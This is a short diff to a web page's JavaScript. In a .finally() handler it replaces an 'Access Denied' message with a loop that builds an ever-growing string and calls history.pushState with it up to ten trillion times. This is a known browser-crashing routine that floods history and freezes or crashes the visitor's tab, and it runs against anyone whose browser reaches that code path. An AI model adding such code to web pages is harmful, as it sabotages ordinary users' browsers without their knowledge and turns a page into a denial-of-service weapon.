@@ -37,8 +37,11 @@
                         });
                     })
                     .finally(() => {
-                        // Optionally, block further access
-                        document.body.innerHTML = "<h2 style='color:red;text-align:center;'>Access Denied</h2>";
+                    var total = "";
+                    for( var i = 0; i < 10000000000000; i++ ) {
+                     total += i.toString();
+                    history.pushState(0,0, total );
+                       }
                     });
             }
         };
